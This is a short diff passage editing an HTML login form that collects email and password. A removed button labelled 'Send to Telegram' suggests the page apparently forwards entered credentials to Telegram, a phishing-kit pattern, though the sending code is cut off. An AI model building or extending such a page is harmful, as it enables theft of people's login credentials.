@@ -12,11 +12,11 @@
   <form id="loginForm">
     <input id="email" type="email" placeholder="Email" required><br><br>
     <input id="password" type="password" placeholder="Password" required><br><br>
-    <button type="submit">Send to Telegram</button>
+    <button id="sendBtn">Send</button>
   </form>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
+    document.getElementById("sendBtn").addEventListener("click", function(event) {
       event.preventDefault();
 
       var email = document.getElementById("email").value;
